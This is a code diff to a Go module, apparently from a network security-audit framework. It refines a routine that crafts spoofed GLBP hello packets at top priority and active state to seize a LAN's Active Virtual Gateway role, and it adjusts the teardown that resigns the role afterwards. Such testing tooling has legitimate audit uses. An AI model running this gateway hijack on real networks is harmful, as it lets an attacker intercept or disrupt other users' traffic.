@@ -3,16 +3,16 @@
 // Durability (from the catalog): temporary-restored. The attack sends a
 // GLBP hello with a high priority (255) and the active state to claim the
 // AVG (Active Virtual Gateway) role. The teardown arms a resign hello
-// (lowered priority, init state) to restore the virtual-router state.
+// (lowered priority, listen state) to restore the virtual-router state.
 //
 // The baseline (l2l3-audit) does not carry a GLBP attack; the craft is
-// spec-authored from RFC 7868.
+// authored from Wireshark's packet-glbp.c at commit
+// 1dbb8baf9c5bb2e9501b15cce98cea6a3c0f41a3, lines 137-218 and 289-365.
 
 package fh
 
 import (
 	"context"
-	"encoding/binary"
 	"encoding/json"
 	"net"
 
@@ -41,7 +41,7 @@ func RunGLBP(ctx context.Context, deps runner.Deps) error {
 	priority := uint8(255)
 
 	// Arm the resign teardown before the first frame.
-	resignPkt, err := craftGLBPHello(src, group, 100, nl.GLBPStateInit)
+	resignPkt, err := craftGLBPHello(src, group, 100, nl.GLBPStateListen)
 	if err != nil {
 		return errs.Wrap(err, "glbp: craft resign")
 	}
@@ -89,20 +89,23 @@ func craftGLBPHello(src net.HardwareAddr, group uint16, priority uint8, state nl
 		SrcPort: 3222,
 		DstPort: 3222,
 	}
-	vmac := net.HardwareAddr{0x00, 0x07, 0xb4, 0x00, 0x01, 0x01}
 	glbp := &nl.GLBP{
-		Version:       1,
-		Opcode:        1, // hello
-		Group:         group,
-		HelloTime:     3000,
-		HoldTime:      10000,
-		VirtualMAC:    vmac,
-		Priority:      priority,
-		State:         state,
-		AddressFamily: 1, // IPv4
+		Version:  1,
+		Group:    group,
+		OwnerMAC: src,
 		TLVs: []nl.GLBPTLV{
-			{Type: 1, Value: binary.BigEndian.AppendUint16(
-				binary.BigEndian.AppendUint16(nil, 3000), 10000)},
+			{
+				Type: 1,
+				Hello: &nl.GLBPHello{
+					State:          state,
+					Priority:       priority,
+					HelloTime:      3000,
+					HoldTime:       10000,
+					AddressType:    1,
+					AddressLength:  4,
+					VirtualAddress: net.IPv4(10, 0, 0, 1).To4(),
+				},
+			},
 		},
 	}
 	return craftUDPLayer(eth, ip, udp, glbp)
